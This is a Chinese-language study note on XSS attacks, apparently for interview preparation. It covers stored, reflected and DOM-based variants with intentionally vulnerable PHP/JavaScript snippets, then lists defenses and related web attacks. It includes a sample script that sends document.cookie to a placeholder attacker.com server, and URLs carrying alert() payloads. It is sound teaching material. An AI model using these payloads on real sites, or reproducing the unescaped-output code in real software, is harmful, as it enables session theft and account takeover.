# XSS跨站脚本攻击是什么？

XSS跨站脚本攻击是什么？
XSS是跨站脚本攻击，攻击者通过在目标网站上注入恶意脚本代码，当用户访问这些页面时，这些脚本会在浏览器，从而盗取用户信息、会话信息等敏感数据，甚至控制用户账户。

XSS 攻击可以分为3类：存储型(持久型)、反射型(非持久型)、DOM型。
存储型 XSS：攻击脚本永久存储在目标服务器上，每次在浏览器展示时执行攻击脚本，达到盗取用户数据目的。
网站中存在漏洞代码：

// 显示评论的代码
echo "<div class='comment'>" . $comment['content'] . "</div>";
攻击者提交的content攻击脚本如下：

<script>
  // 窃取用户的cookie并发送到攻击者的服务器
  var img = new Image();
  img.src = "http://attacker.com/steal.php?cookie=" + document.cookie;
</script>
反射型 XSS：当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自"可信任"的服务器，所以会执行这段脚本；
网站中存在漏洞：

<!-- 搜索结果页面 -->
<p>您搜索的是: <?php echo $_GET['keyword']; ?></p>
攻击者诱导用户点击的URL：

http://example.com/search.php?keyword=<script>alert('XSS攻击!')</script>
基于 DOM 的 XSS：通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于 DOM 环境被恶意修改，有客户端代码被包含进了页面，并且意外执行；
网站中存在漏洞代码：

// 从URL获取参数并显示
var name = document.location.hash.substring(1);
document.getElementById('welcome').innerHTML = "欢迎, " + name;
攻击者诱导用户点击的URL：

http://example.com/#<img src=x onerror=alert('XSS')>

预防XSS攻击的方法主要包括以下几点：
输入验证：对所有用户输入的数据进行有效性检验，过滤或转义特殊字符。例如，禁止用户输入HTML标签和JavaScript代码；
输出编码：在网页输出用户输入内容时，使用合适的编码方式，如HTML转义、URL编码等，防止恶意脚本注入；
Content Security Policy（CSP）：通过设置CSP策略，限制网页中可执行的脚本源，有效防范XSS攻击。使用HttpOnly标记:在设置Cookie时，设置HttpOnly属性，使得Cookie无法被JavaScript代码读取，减少受到XSS攻击的可能。

<!-- 面试复习补充 -->

## 面试复习补充

### 核心概念

网络安全关注机密性、完整性、可用性和身份认证。常见攻击包括 XSS、CSRF、SQL 注入、DDoS、DNS 劫持和中间人攻击。

### 面试官想考什么

面试官想看你是否能说明攻击原理、危害和工程防护，而不是只背缩写。

### 标准回答

XSS 是注入脚本在用户浏览器执行，防护靠输出编码、CSP、HttpOnly；CSRF 是借用户登录态伪造请求，防护靠 SameSite、CSRF Token、校验 Origin/Referer；SQL 注入靠拼接 SQL 注入恶意语句，防护靠预编译和参数绑定；DDoS 需要限流、清洗和弹性防护；HTTPS 可降低中间人窃听篡改风险。

### 深挖追问

- 如果线上出现超时/失败，如何验证是不是这个环节？
- 它和相邻层协议的职责边界是什么？
- 有哪些参数或默认行为会影响生产表现？

### 实战场景/示例

评论区未转义用户输入导致脚本窃取 Cookie，这是典型存储型 XSS；转账接口只靠 Cookie 鉴权且无 CSRF Token，则可能被跨站表单触发。

### 易错点/总结

前端校验不能替代服务端防护；HTTPS 也不能防止应用层越权和注入漏洞。

